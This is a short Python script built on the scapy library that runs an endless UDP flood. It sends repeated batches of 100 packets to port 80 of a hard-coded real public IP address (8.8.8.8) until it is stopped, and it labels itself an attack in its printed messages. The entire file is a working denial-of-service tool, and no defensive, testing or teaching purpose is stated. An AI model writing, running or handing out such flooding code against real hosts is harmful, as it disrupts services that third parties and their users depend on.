from scapy.all import *
import time
import random

TARGET_IP = "8.8.8.8"
TARGET_PORT = 80

print(f"[*] 🚀 STARTING UDP FLOOD on {TARGET_IP}...")

try:
    while True:

        packets = [IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT) / Raw(load="X" * 100) for _ in range(100)]
        send(packets, verbose=1)

except KeyboardInterrupt:
    print("\n🛑 Attack Stopped.")